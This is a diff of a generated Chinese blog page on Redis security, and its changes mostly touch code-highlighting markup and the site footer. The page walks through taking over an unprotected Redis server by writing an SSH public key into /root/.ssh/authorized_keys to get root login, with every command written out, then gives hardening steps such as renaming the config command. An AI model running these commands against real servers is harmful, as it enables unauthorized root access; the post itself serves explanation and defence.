@@ -105,24 +105,24 @@
 <ul>
 <li>
 <p>如果本地没有配置过ssh，先生成公钥和私钥</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ssh-keygen -t rsa
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">  ssh-keygen -t rsa
+</span></span></code></pre></div></li>
 <li>
 <p>将公钥写入一个txt文件</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat ~/.ssh/id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; test.txt
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat ~/.ssh/id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; test.txt
+</span></span></code></pre></div></li>
 <li>
 <p>连接Redis并把公钥文件写入。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">cat test.txt <span class="p">|</span> redis-cli -h <span class="o">{</span>server.ip<span class="o">}</span> -x <span class="nb">set</span> attack_key
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">cat test.txt <span class="p">|</span> redis-cli -h <span class="o">{</span>server.ip<span class="o">}</span> -x <span class="nb">set</span> attack_key
+</span></span></code></pre></div></li>
 <li>
 <p>登入未受保护的Redis，进行如下命令操作。通过config命令修改了持久化目录及持久化文件名，使持久化的DB文件刚好为root用户SSK key存放的文件，然后save将公钥追加到authorizew_keys文件的末尾，也就上传了公钥。之后便可以使用SSH以root用户登录目标服务器。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">redis-cli -h <span class="o">{</span>server.ip<span class="o">}</span>
-<span class="c1"># 下面都是Redis Client的交互命令</span>
-config <span class="nb">set</span> dir /root/.ssh/
-config <span class="nb">set</span> dbfilename <span class="s2">&#34;authorized_keys&#34;</span>
-save
-</code></pre></div></li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">redis-cli -h <span class="o">{</span>server.ip<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 下面都是Redis Client的交互命令</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir /root/.ssh/
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename <span class="s2">&#34;authorized_keys&#34;</span>
+</span></span><span class="line"><span class="cl">save
+</span></span></code></pre></div></li>
 <li>
 <p>拿到root用户，之后自然就是为所欲为了～</p>
 </li>
@@ -143,9 +143,9 @@ save
 <pre tabindex="0"><code>useradd -M -s /sbin/nologin {username}
 </code></pre><h3 id="5屏蔽重要指令">5.屏蔽重要指令</h3>
 <p>可以将一些重要命令设置为空，即禁用，也可以重命名成更复杂的名字。修改完成后需要重启Redis生效。</p>
-<pre tabindex="0"><code>rename-command config &quot;&quot;
-rename-command flushall &quot;&quot;
-rename-command flushdb &quot;&quot;
+<pre tabindex="0"><code>rename-command config &#34;&#34;
+rename-command flushall &#34;&#34;
+rename-command flushdb &#34;&#34;
 rename-command shutdown shutdown_wxj
 </code></pre><p>在Redis 3.0.2版本以下存在EVAL沙箱逃逸漏洞，攻击者可以通过该漏洞执行任意Lua代码，可以通过rename config命令和在redis.conf中限制访问源来规避风险。</p>
 </div><div class="post-footer" id="post-footer">
@@ -176,7 +176,7 @@ rename-command shutdown shutdown_wxj
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.4">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.93.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
                 </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
         </div>
     </footer></div>
